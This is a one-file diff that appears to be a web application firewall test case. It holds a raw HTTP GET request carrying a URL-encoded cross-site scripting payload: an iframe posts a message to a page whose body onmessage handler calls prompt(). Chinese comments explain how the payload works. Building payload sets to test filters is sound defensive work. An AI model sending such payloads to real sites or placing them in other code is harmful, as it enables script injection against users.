@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_iframe标签_onmessage事件-06506583
+# 攻击载荷利用了HTML中的iframe标签和onmessage属性，触发prompt()函数，显示一个提示框。当从 postMessage 调用接收到消息事件时触发
+GET /?id=%3Ciframe%20onload=%22this.contentWindow.postMessage%28%27%27%2C%27%2A%27%29%22%20src=%22https:%2F%2Ftest.com%2Fxss%2Fxss.php%3Fx=%3Cbody%20onmessage=prompt%28%2Fxss%2F%29%3E%22%3E%3C%2Fiframe%3E&bid=hd_tag_m8mv267m HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv267m
+RM-PRO-Token: 566a3319393768378663fda32fd87609
+RM-PRO-Time: 1742808552095
+User-Agent: curl/7.83.1
+
